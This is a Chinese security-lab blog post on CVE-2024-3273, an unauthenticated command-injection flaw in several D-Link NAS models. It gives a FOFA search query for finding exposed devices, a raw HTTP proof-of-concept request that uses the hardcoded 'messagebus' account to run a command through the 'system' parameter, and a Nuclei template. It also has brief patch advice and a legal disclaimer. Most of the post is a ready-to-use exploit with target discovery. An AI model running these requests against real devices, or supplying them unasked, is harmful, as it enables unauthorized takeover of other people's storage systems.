#  D-Link NAS 未授权RCE   
可可  巢安实验室   2024-05-19 23:00  
  
0x01 产品介绍  
  
D-Link 网络存储 (NAS)是中国友讯（D-link）公司的一款统一服务路由器。  
  
0x  
0  
2 漏洞威胁  
  
D-Link NAS nas_sharing.cgi接口存在命令执行漏洞，该漏洞存在于“/cgi-bin/nas_sharing.cgi”脚本中，影响其 HTTP GET 请求处理程序组件。漏洞成因是通过硬编码帐户（用户名：“messagebus”和空密码）造成的后门以及通过“system”参数的命令注入问题。未经身份验证的攻击者可利用此漏洞获取服务器权限。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyX3qa0cdFJXVnslmEw5to8vnsO2qmX6wON2kEyvSI9HH65tplah46XaBOa5khTb2COMicNHtwPGDw/640?wx_fmt=png&from=appmsg "")  
  
0x  
0  
3  影响范围：  
```
DNS-320L Version 1.11, Version 1.03.0904.2013, Version 1.01.0702.2013
DNS-325 Version 1.01
DNS-327L Version 1.09, Version 1.00.0409.2013
DNS-340L Version 1.08
```  
## 0x04 漏洞复现  
## fofa语句  
```
"Text:In order to access the ShareCenter, please make sure you are using a recent browser(IE 7+, Firefox 3+, Safari 4+, Chrome 3+, Opera 10+)" 
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyX3qa0cdFJXVnslmEw5to8QW4wjSQkXXPvdUX02P8UiaMZrhxJD4uiah8L0WLuv31BE02JiaULagP6Q/640?wx_fmt=png&from=appmsg "")  
  
**POC**  
```

GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ= HTTP/1.1
Host: your-ip
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
Accept-Encoding: identity
Accept: */*
Connection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyX3qa0cdFJXVnslmEw5to8dbvMVjWibWEuzS8qY3dOGfjsGPezjYp2rqGjEO6hPXqrWUiagJJoSOibg/640?wx_fmt=png&from=appmsg "")  
## Nuclei脚本  
```
id: CVE-2024-3273

info:
  name:D-Link NAS 未授权RCE
  author: kong
  severity: high
  description: 通过硬编码帐户（用户名：“messagebus”和空密码）造成的后门以及通过“system”参数的命令注入问题。未经身份验证的攻击者可利用此漏洞获取服务器权限。
  reference:
    - https://github.com/adhikara13/CVE-2024-3273
  tags: tags

http:
  - raw:
      - |+
        GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ= HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
        Connection: close


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - uid
          - gid
      - type: status
        status:
          - 200
```  
## 修复建议  
  
关闭互联网暴露面或接口  
  
目前厂商已发布升级补丁以修复漏洞，补丁获取链接：  
```
https://buaq.net/go-232770.html
https://github.com/adhikara13/CVE-2024-3273
https://www.trustwave.com/en-us/resources/security-resources/security-advisories
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/n2rSqJSRAVzNPDEiadhLROCQUuMQyouq2OicjCbTSbk6ZLyzR1uHhPhJZLuZTFaM31tS5jvcDB3sfVsb9novFWeQ/640?wx_fmt=jpeg "")  
  
**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**  
  
****  
**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。公众号内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**  
  
****  
**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**  
  
  
  
